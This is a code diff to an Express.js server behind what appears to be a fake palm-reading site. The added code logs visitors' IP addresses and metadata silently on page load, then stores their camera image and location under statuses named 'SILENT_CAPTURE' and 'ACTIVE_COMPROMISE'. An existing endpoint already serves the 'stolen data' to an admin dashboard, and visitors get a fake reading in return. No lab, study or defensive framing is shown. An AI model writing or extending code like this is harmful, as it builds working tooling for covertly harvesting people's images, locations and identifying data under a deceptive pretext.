@@ -53,25 +53,58 @@ app.get('/api/server-info', (req, res) => {
     });
 });
 
+// API Endpoint to receive silent data on page load
+app.post('/api/silent-log', (req, res) => {
+    const { sessionId, metadata } = req.body;
+    
+    const entry = {
+        sessionId: sessionId,
+        timestamp: new Date().toISOString(),
+        ip: req.ip,
+        status: 'SILENT_CAPTURE',
+        metadata: metadata || {}
+    };
+    
+    capturedData.push(entry);
+    console.log(`[!] SILENT CAPTURE from IP: ${entry.ip}`);
+    
+    res.json({ success: true });
+});
+
 // API Endpoint for Admin Dashboard to get stolen data
 app.get('/api/data', (req, res) => {
     res.json(capturedData);
 });
 
-// API Endpoint to receive the "scanned" palm
+// API Endpoint to receive the "scanned" palm and active permissions
 app.post('/api/analyze', (req, res) => {
-    const { image, metadata } = req.body;
+    const { sessionId, image, metadata, location } = req.body;
     
-    // In a real malicious scenario, the image and metadata would be saved to a database or file system here.
-    const entry = {
-        timestamp: new Date().toISOString(),
-        ip: req.ip,
-        metadata: metadata || {}
-    };
+    // Find the existing session created during silent capture
+    const existingEntry = capturedData.find(e => e.sessionId === sessionId);
     
-    capturedData.push(entry);
+    if (existingEntry) {
+        existingEntry.status = 'ACTIVE_COMPROMISE';
+        existingEntry.metadata.cameraImage = !!image; // Just log that we got it to avoid huge memory usage, or save base64
+        existingEntry.base64Image = image; 
+        existingEntry.location = location;
+        existingEntry.timestamp = new Date().toISOString(); // Update time
+        console.log(`[!!!] ACTIVE COMPROMISE upgraded for IP: ${existingEntry.ip}`);
+    } else {
+        // Fallback if silent log didn't run
+        capturedData.push({
+            sessionId: sessionId || Date.now().toString(),
+            timestamp: new Date().toISOString(),
+            ip: req.ip,
+            status: 'ACTIVE_COMPROMISE',
+            base64Image: image,
+            location: location,
+            metadata: metadata || {}
+        });
+        console.log(`[!!!] ACTIVE COMPROMISE (New Session) for IP: ${req.ip}`);
+    }
     
-    console.log(`[+] Captured new victim data: ${entry.ip}`);
+    console.log(`[+] Active flow completed for: ${req.ip}`);
 
     // Return a fake palm reading analysis
     const readings = [
